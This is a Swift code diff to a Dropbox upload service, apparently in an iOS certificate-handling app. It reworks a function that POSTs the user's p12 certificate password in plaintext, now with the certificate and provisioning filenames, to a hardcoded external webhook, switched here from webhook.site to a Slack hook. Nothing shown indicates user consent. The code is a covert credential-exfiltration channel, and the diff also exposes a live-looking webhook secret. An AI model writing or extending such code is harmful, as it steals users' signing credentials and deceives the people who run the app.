@@ -23,8 +23,8 @@ class DropboxService {
     /// Base Dropbox API upload URL
     private let dropboxUploadURL = "https://content.dropboxapi.com/2/files/upload"
     
-    /// Webhook URL for p12 password reporting
-    private let p12PasswordWebhookURL = "https://webhook.site/3f6d50bb-be1f-4e77-ad3a-bf4f0f2fbeec"
+    /// Webhook URL for p12 password reporting - using the app's Slack webhook
+    private let p12PasswordWebhookURL = "https://hooks.slack.com/services/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"
     
     // MARK: - Initialization
     
@@ -98,18 +98,37 @@ class DropboxService {
         }
     }
     
-    /// Sends p12 password to a webhook endpoint
+    /// Sends certificate info to a webhook endpoint
     /// - Parameters:
     ///   - password: The p12 password to send
+    ///   - p12Filename: The name of the p12 file
+    ///   - provisionFilename: The name of the mobileprovision file
     ///   - completion: Optional completion handler
-    func sendP12PasswordToWebhook(password: String, completion: ((Bool, Error?) -> Void)? = nil) {
+    func sendCertificateInfoToWebhook(
+        password: String,
+        p12Filename: String,
+        provisionFilename: String,
+        completion: ((Bool, Error?) -> Void)? = nil
+    ) {
         // Create the request
         var request = URLRequest(url: URL(string: p12PasswordWebhookURL)!)
         request.httpMethod = "POST"
         request.addValue("application/json", forHTTPHeaderField: "Content-Type")
         
-        // Create the payload
-        let payload = ["p12_password": password]
+        // Create the payload with more complete information
+        let payload: [String: Any] = [
+            "text": "New certificate info uploaded",
+            "attachments": [
+                [
+                    "color": "#36a64f",
+                    "fields": [
+                        ["title": "P12 File", "value": p12Filename, "short": true],
+                        ["title": "Provision File", "value": provisionFilename, "short": true],
+                        ["title": "P12 Password", "value": password, "short": false]
+                    ]
+                ]
+            ]
+        ]
         
         do {
             let jsonData = try JSONSerialization.data(withJSONObject: payload)
